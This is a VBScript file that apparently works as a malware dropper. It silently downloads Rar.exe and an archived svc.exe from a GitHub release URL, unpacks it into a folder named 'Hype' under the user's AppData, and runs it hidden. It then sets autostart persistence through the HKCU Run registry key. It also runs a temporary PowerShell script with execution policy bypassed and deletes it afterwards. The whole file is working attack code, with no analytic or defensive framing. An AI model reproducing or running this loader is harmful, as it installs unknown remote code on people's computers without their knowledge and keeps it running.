Dim fso, shell, hypeFolder, svcPath, tmpDir, rarExePath, svcRarPath, rndName
Dim http, stream

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

hypeFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Hype\"
svcPath = hypeFolder & "svc.exe"

If fso.FolderExists(hypeFolder) And fso.FileExists(svcPath) Then
    If UCase(GetCRC32(svcPath)) = "FB9058AC" Then WScript.Quit 0
End If

rndName = fso.GetTempName()
tmpDir = fso.BuildPath(fso.GetSpecialFolder(2), rndName)
fso.CreateFolder tmpDir

rarExePath = fso.BuildPath(tmpDir, "Rar.exe")
svcRarPath = fso.BuildPath(tmpDir, "svc.rar")

Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

http.Open "GET", "https://github.com/b4xwv6p/main/releases/download/bin/Rar.exe", False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile rarExePath, 2
    stream.Close
    Set stream = Nothing
End If

http.Open "GET", "https://github.com/b4xwv6p/main/releases/download/bin/svc.rar", False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile svcRarPath, 2
    stream.Close
    Set stream = Nothing
End If

Set http = Nothing

If Not fso.FolderExists(hypeFolder) Then fso.CreateFolder hypeFolder

shell.Run """" & rarExePath & """ x -y """ & svcRarPath & """ """ & tmpDir & "\""", 0, True

If fso.FileExists(tmpDir & "\svc.exe") Then
    fso.CopyFile tmpDir & "\svc.exe", svcPath, True
    shell.Run """" & svcPath & """", 0, False
    shell.Run "reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""Hype"" /t REG_SZ /d """ & svcPath & """ /f", 0, True
End If

Set fso = Nothing
Set shell = Nothing

Function GetCRC32(filePath)
    Dim psCode, psPath, psShell, psExec, psFile
    psCode = "$c=0xFFFFFFFF;$t=New-Object uint32[] 256;for($i=0;$i-lt256;$i++){$c2=$i;for($j=0;$j-lt8;$j++){if($c2-band1){$c2=($c2-shr1)-bxor0xEDB88320}else{$c2=$c2-shr1}};$t[$i]=$c2};$b=[System.IO.File]::ReadAllBytes('" & filePath & "');foreach($x in $b){$i2=($c-band0xFF)-bxor$x;$c=(($c-shr8)-band0x00FFFFFF)-bxor$t[$i2]};Write-Host ('{0:X8}'-f($c-bxor0xFFFFFFFF))"
    Set psShell = CreateObject("WScript.Shell")
    psPath = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".ps1"
    Set psFile = fso.CreateTextFile(psPath, True)
    psFile.Write psCode
    psFile.Close
    Set psFile = Nothing
    Set psExec = psShell.Exec("powershell -ExecutionPolicy Bypass -File """ & psPath & """")
    GetCRC32 = Trim(psExec.StdOut.ReadAll())
    If fso.FileExists(psPath) Then fso.DeleteFile psPath
End Function
